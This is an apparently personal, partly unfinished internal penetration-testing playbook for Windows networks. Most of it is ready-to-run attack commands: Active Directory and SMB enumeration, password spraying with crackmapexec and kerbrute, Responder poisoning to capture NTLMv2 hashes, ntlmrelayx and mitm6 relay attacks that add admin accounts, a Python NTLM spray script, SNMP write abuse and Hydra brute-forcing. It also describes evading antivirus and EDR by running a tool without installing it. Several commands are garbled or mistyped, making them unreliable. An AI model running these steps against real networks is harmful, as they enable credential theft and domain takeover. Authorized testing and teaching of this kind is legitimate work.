# Internal Pentesting

**This is done in phases**
- Phase 1: Initial enumerations no credentials
- Phase 2: Enumeration with Credentials
- Phase 3: Protocol/Services Exploitation
- Phase 4: Local Administrator Access
- Phase 5: Domain Administrator Access

### Objective:
Simply begin by identifyin all open hosts using NMAP, we want to do a specific port scan to find easy targets but we also want to export an full scan to a text file. We also want to run the advanced IP scanner tool to identify all services, printers and networking devices.  NEED TO FINISH THIS STATEMENT

# Phase 1: Initial Enumeration
## Host Discovery/Fingerprinting/Footprinting
 **Ping Scan - identify all hosts**
 - nmap -sP IP RANGE -oN <EXPORT PATH>
 - Note: export this into a file of IPs to use in the following scans.
 **Identify everything to review if needed**
 - nmap -A -O -p-  -iL <IP FILE> -oA <EXPORT PATH>

**Run GNMAP-Parser**
- Run parse function 
   * ./Gnmap-Parser.sh --p nmapFile

**(Optional) Identify critical ports (low hanging fruit scan)**
     nmap -A -p  21,22,23,25,139,53,80,137, 443,445, 8080, 8443,69 -iL <IP FILE>
  
  **Find the AD/DC**
    nmap -p 389,636,53,88 X.X.X.X
    ldapsearch -x -h <ip> -s base
    nmap -n -sV --script"ldap" and not brute -p 389 <DC-IP>

 **Eyewitness Port 80,443**
    eyewitness --web -f <nmap IP file>
    
## Additional Network Scans
**Run advanced IP scanner**
- This allows us to see file shares, websites and devices in the network. If you download but setup as run instead of install, I find this doesnt get blocked by AV       this way.
- This is a cool tool because you can download the exe but choose to run instead of install. This bypasses a lot of restrictions on user downloads or EDR tools.
    https://www.advanced-ip-scanner.com/

  **Identify all host names**
- Using crackmapexec, dont specify credentials and use the CIDR mask. This should identify all hostnames
- crackmapexec smb X.X.X.X/24

## SMB Verify Relay Attacks
- WHY? Verify SMB Signing needs is disabled or not required, verify with NMAP)

- NMAP CMD: nmap -p 445 --script=smb2-security-mode X.X.X.X
- NMAP CMD: nmap -p 139--script=smb2-security-mode X.X.X.X

## Active Directory Enumeration
- If AD is not properly configured, an unauthenticated user can enumerate users, password policies, group memberships, shares and more. We can use this to identify a lot of sensitive information about a network.

**AD Password policy**
- enum4linux -P x.x.x.x >> export path 
- crackmapexe <IP> -u "user" -p "password" --pass-pol

**Active Directory Users**
- enum4linux -U x.x.x.x   | grep 'user'  OR   >> export path  

**Machine list**
- enum4linux -M x.x.x.x >> export path  

**Other Policies**
- Groups with members > enum4linux -M x.x.x.x >> export path  
- Shares > enum4linux -S x.x.x.x >> export path  

**Scan for All**
- enum4linux -a X.X.X.X >> ./ADdiscovery.txt

## SMB Enumeration
- ubeus.exe asktgt /users:>users> /certificate:<base64-certificate> ptt

**List Guest Access on SMB Share**
- enum4linux -a -u "" -p "" <DC-IP>
- enum4linux -a -u "guest" -p "" >DC-ip>

- smbmap -u "" -p "" -P 445 -H <DC-ip>
- smbmap -u "guest" -p "" -P 445 -H <dc-ip>

- smbclient -U '%' -L //DC-IP
- smbclient -U 'guest%' -L //dc-ip

- cme smb <IP> -u '' -p ''   looks for null sessions
- cme smb <ip> -u 'a' -p "" looks for anonymouse access

**Listing shares on devices**
- smbclient -L //X.X.X.X/
- smbclient -L //X.X.X.X/ -U '' -N

## Build Userlist
Users can come from the following sources so far
- Responder
- MITM6
- Printers
- SMB enumeration
- Enum4linux finds
- OSINT the website and external resources
- nmap -p 88 --script=krb5-enum-users --script args="krb5-enum-users.realm='<DOMAIN>'.userdb=<user_list_file> <IP>
- SNMP enumeration, see section below.

**LinkedIn**
- Inspect the page where it shows LinkedIn employees, go to Javascript code and run the following code at the bottom. NOTE identify the right class in order to run this correctly.

- var x = document.getElementByClassName("org-people-profile-card_profile-info")
- var y = "";
- for(let num = 0;num <x.length;num++)
- {y +=x[num[.innerText.split('\n',1) + ';'}

- breach-parse

## Password Attacks
The preferred method here is to take our users found and look for valid passwords. If we discovered the password policy in phase 1 then we know how frequent our tests can be. I often will use my userlist and test it with a single password twice every 30 to 45 minutes. You can lock one user out to verify but be careful with this. When you find a valid user and password combo, you can then throw the credentials across the network. When password spraying I often choose a simpe desktop IP address as any standard user should have access to it.

- enum4linux -u "User:" -p "password" -P <IP>

You can test this against a user by locking out with crackmapexec
- crackmapexec smb <IP> -u USERNAME -p <doesnt matter> -d <domain>  
Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

- cme smb <dc-IP -u user.txt -p password.txt --no-bruteforce
- cme smb <dc-ip> -u user.txt -p password.txt (only use if no lockout policy)
- crackmapexec smb <dc-ip> -u user.txt -p "PASSWORD" -d <domain> (use this to test single passwords)
You can test this against a user by locking out with crackmapexec. Note the amount of failed attempts to lock out and then time the reset, wait for 30 minutes first and then increment to 1 hour. This is tedious and is used if other methods dont work.

**kerbrute**
- ./kerbrute_linux_amd64 passwordspray -d <DOMAIN.com> <username file> <single password to test>
- 1. You should have a Username list from your OSINT by now in a text file
- 2. Verify if users are present

- ./kerbrute_linux_amd64 userenum -d <DOMAIN.com> <usernames.txt>
- anything returned PRINCIPAL UNKNOWN isnt a legit account

**Keyspace Techniques**
About Keyspace Techniques
- A method of preparing a wordlist by specifying a range of characters and numbers and symbols in the wordlist.
- A tool used for this is crunch, we can specify numerous options, min and max and options
Example Commands
- crunch 2 2 01234abcd -o crunch.txt
- this will generate all possible password combinations of 2 characters including 0-4 and a-d. The -o specifies a file to save output to.
-cmd: crunch 8 8 0123456789abcdef -o crunch.txt
- this outputs a minimum and and max of 8
- If we know part of the word in the password and want all possibilities you can do the following
-cmd: crunch 6 6 -t pass%
- This says the password is 6 characters and the pass part is followed by numbers
- other character specifiers
- @ = lower case alpha characters
- , upper case alpha characters
-^ special characters including space

**CUPP**

About CUPP - Common User passwords profiler
- automatic and interactive tool written in python for creating custom wordlists
- used to build passwords based oof well known details about the target THIS MEANS OSINT is needed
- This also has L33t mode which allows for someone to replace a,e,i,o,u with numbers.
Running CUPP
- Install from git clone https:.//github.com/Mebus/cupp.git then run CMD: python3 cupp.py
- you can also include default creds from the alecto database using -a

Dictionary and Brute Force 
- About Dictionary Attacks
- used to guess passwords by well known words or phrases. Relies on a wordlist
- We can often use this against a captured hash with hashcat to crack.
- NOTE: if you dont know the hash use a tool called hashid or hash-identifier
- switches HASHCAT
-a 0 sets dictonary mode attack
-a 3 sets to brute force
-m 0 sets hash mode for cracking
-About brute force attacks
-attack to gain unauthorized access to an account.
- this guesses the victims password by sending standard password combinations.
- the diffrence from a dictionary is that that uses an entire dictionary while brute force may aim to try all combinations of characters.
- cracking a hash with hashca

Create password lists from websites
- CMD: cewl -m 8 -w wordlist.txt <URL>

## LLMNR, NBT-NS, WPAD Attack
About LLMNR, NBT-NS, WPAD – the service running with a poor password policy. 
We want to run this attack during primary times of logins etc, we like to focus when the admins/users login around the morning wave, the lunch return times as well. NOTE: you can't run Mitm6 and responder at the same time, they use the same ports and cant run together.

**Poisoning Overview and Capturing NTLMv2 Hashes with Responder**
- Link local multicast resolution (DNS to identify a host when DNS fails to do so).  
- Key flaw, when you respond to this, it responds back to you with a username and password hash 

**How it works**
- Computer trys to connect to a server but the user sends something wrong sending a DNS issues so the server says what are you talking about? So broadcast message is sent to everyone to see if anyone knows who this weird guy is. You MiTm this and say I do send me your hash and I will 
- We Use responder, this should run first thing in the morning or right after lunch. You need a lot of traffic. DO THIS before nmap scans and more 
- CMD: responder –I INTERFACE(ETHO) -v -w

**Example of an event**
- Someone types in the wrong network drive. Once this happens, an event occurs and we will see the username and NTLM hash. 
- Take this hash and try to crack it using hashcat. 
- EASY TERMS: Okay so kali is in the environment and your are listening on responder. When a windows computer tries to access your IP address for a share or something, responder captures the username and hash. 

## SMB Relay With Responder
**What is this?**
- Take the hashes we get from responder and forward them, SMB signing has to be enabled because it’s a packet level protocol. If siginig is disabled then it  never checks for authentication of the user and hash. 
- User being relayed has to have admin creds on the target machine 
- Go into responder config file
- vim /opt/responder/Responder.Conf
- vim /etc/responder/Responder.conf
- Turn off smb and http 
- Means we capture these but we use another tool to relay 
- Launch responder 

**Attack for SMBrelay**
- impacket-Ntlmrelayx.py -tf targets.txt -smb2support
- Now we just wait for an event, if an admin, it will dump the sam files for the local users. 
- We get hashes from the sam and will try to laterally move 
  
**Will attempt for an interactive shell and say if it worked, open a new tab**
- Nc 127.0.0.1 11000 
- Help 
- We are in an smb shell essentially, so start listing to find items 
- Try use ADMIN$ to get into system32 
- LOTS MORE YOU CAN DO
- You could do a metasploit shell with multihandler using the ntlmrelayx 
- EASY TERMS: You take the hashing if SMB signing is disabled, you attempt to relay the smb authentication. We user responder to capture and then relay to attack. Ntlmrelayx is inside impacket. So cd impacket/examples 
- WE MUST GO INTO THE RESPONDER FILE AND TURN OFF SMB and HTTP 
- ntlmrelayx --add-computer   usually gives initial access.


## Responder Passback Attacks  (LDAP Attack)
- Netcat and responder can do this 
- Printer based attack where you send the password back to your machine instead of the DC by setting the LDAPs to you. 
- Printers who scan from printer to computers, the user in the platform is usually a domain admin and dump the creds with the passback attack. PRINTERS ARE A HUGE ATTACK vector. 
- Jenkins is often wide open for a shell 

## Relay Attack Other Option
On a seperate machine run this, they cant run on the same device

**MITM6CMD**
- Mitm6 –d DOMAIN 
- Replies start coming in 

**Relay attack** 
- ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l text.txt 
- Running this 
- Start enumerating entire AD 
- This will add a user and password as an admin

- mitm6 -d <domain>
- ntlmrelayx.py -6 -wh <attackerIP> -; /tmp - socks -debug
- ntlmrelayx.py -6 -wh <attackerIP> -t smb://<target> -l /tmp -socks -debug
- ntlmrelayx.py -t ldaps://<dc IP> -wh <attacker_ip> --delegate-access
- If any of these work
- (impacket) ./getST.py -spn cifts/<target> <domain>/<netbios Name>\$ -impersonate <user>


## Python NTLM Password Spray
**What**
This is a brute forcing tool for any internal website that allows for Windows authentication. It performs password stuffing against websites that are federated with the kerberos network.

**How To use this**
- Name it ntlm_passwordspray.py
- CMD: python ntlm_passwordspray.py -u <USERNAMEFILE> -f <FQDN of organization were attacking> -p <SINGLE PASSWORD> -a <the URL of the application that supports windows authentication

- EXAMPLE:python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a   

- def password_spray(self, password, url): 
- print ("[*] Starting passwords spray attack using the following password: " + password)
- #Reset valid credential counter 
- count = 0 
- #Iterate through all of the possible usernames 
- for user in self.users: 
- #Make a request to the website and attempt Windows Authentication 
- response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password)) 
- #Read status code of response to determine if authentication was successful 
- if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): 
- print ("[+] Valid credential pair found! Username: " + user + " Password: " + password) 
- count += 1 
- continue 
- if (self.verbose): 
- if (response.status_code == self.HTTP_AUTH_FAILED_CODE): 
- print ("[-] Failed login with Username: " + user) 
- print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")   

## SNMP Enumeration
### About
- SNMP v1 and v2 communicate in clear-text allowing us to find community strings. 
THE BIGGEST EXPLOIT seen with this is when SNMP public community strings are left as "public" which is the default.
Community strings can be set to whatever the system administrator wants so a good dictionary should include company related terms, sports teams, etc.

**Process**
- Identify the presence of SNMPv1 or v2
- Test default strings
**Brute force strings**
- Enumerate the system for users, softwared, ram,machines
- Use this information to create your user list and device list.

**NMAP Discovery****
- We can check this with NMAP by first identifying the SNMP version
- nmap -sV -Pn -sU -p161,162 X.X.X.X
- If we get a successful SNMPv1 or v2 we know we are in luck to test for public strings
- nmap -Pn -sU -p 161,162 --script=snmp-brute X.X.X.X
- The output here wll state snmp brute public -valid credentials. Meaning that public are used to read and write snmp data.
- Brute force with custom wordlists
- sudo nmap -sU -p161,162 --scriptsnmp-brute --script-args snmp-brute.communitiesdb=/PATH X.X.X.X
- We need to identify SNMP interfaces to understand where we can begin attacking
- nmap -Pn -sU -p 161,162 --script=snmp-interfaces X.X.X.X
- One of these interfaces should have the IP address we are scanning
                                                                                                                          
**NMAP Users and machine grabs****
- nmap -sU -p161,162 --script=snmp-* X.X.X -oG desktop/file.txt

**SNMP-check**
- This tool can provide some  awesome information such as hostname,description, uptime, user accounts, routing informaiton and listening ports.
- snmp-check X.X.X.X -c STRING

**Switches**
• -p port
• -c string, default is public
• -v snmp version
• - disable TCP
• -t timeout
• -r retries
• -i info
• -h help

**onesixtyone**
- onesixtyone -c /path/onesixtyone/dict.txt X.X.X.X
- This is used to brute force communities with a wordlist

**snmpwalk**
We can use this tool to identify specific strings by testing them
- snmpwalk -c public X.X.X.X -v1
- snmpwalk -c private X.X.X.X -v1

**Extract the system name (the OID) I dont quiet understand this yet**
- snmpwalk -c public X.X.X.X -v1 -On | grep '1.3.6.1.2.1.1.5'
- -c is the string
- the numbers are the sysName value
- If it is misconfigured and has RW then you can change the name with
- snmpset -v 1 -c public X.X.X.X 1.3.6.1.2.1.1.5.0 s HACKED
- Extract System Data
- snmpwalk -v2c -c public X.X.X.X
- snmpwalk -v2c  -c public X.X.X.X hrMemorySize
- View installed software
- snmpwalk -v2c -c public X.X.X.X hrSWInstalledNamed
- Search RAM on the host

**MSFCONSOLE**
- SNMP Enumeration
- use auxiliary/scanner/snmp/snmp_enum
- set RHOSTS
- set community STRING
- you can also not set the string and see if data is returned
- run
- Login to SNMP to test strings
- use auxiliary/scanner/snmp/snmp_login
- set RHOSTS
- run
- This will provide successful login strings.
- SNMP Set OID Value
- use auxiliary/scanner/snmp/snmp_get
- set OID X.X.X.X.X.x
- set OIDVALUE words!
- set RHOSTS X.X.X.X
- exploit
- The value should be shown as the new value

##SPECIFIC PROTOCOL ATTACKS Without Credentials

**1. FTP**
- We want to brute force this server using Hydra
- CMD: hydra -l ftp -P <WORDLIST> ftp://X.X.X.X


**2. SMTP**
-We can brute force SMTP servers using hydra but you may need to specify port 25 depending if you use a different tool.
-CMD: hydra -l ermail@domain.com -P <URL> smtp://x.x.x.x -V

**SSH**
- Hydra can also brute force this but you need a great user list and wordlist
- CMD: hydra -L users.txt -P <WORDLIST> ssh://x.x.x.x -v

**HTTP Login Pages**
- See web pentesting checklist
  
## Banner Grabbing
- telnet X.X.X.X 25
- telnet X.X.X.X 21
- telnet X.X.X.X 22
- telnet X.X.X.X 80     or     nc X.X.X.X 80 
- this should gives us the HTTP version, Server information (IIS version), and some other data. Can help identify servers to attack. 

**POP3**
- telnet X.X.X.X 110   or    telnet x.x.x.x 993
 
  Pop3 Telnet Commands
- USER username
- PASS password
- STAT
- LIST  list email files
- RETR NUMBER   retrieves emails
- DELE deletes
- NOOP
- RSET
- TOP
- UIDL
If you dont have credentials, you can brute force it with HYDRA

- hydra -l USERNAME -P <password list> pop3.live.com? -s PORT pop3
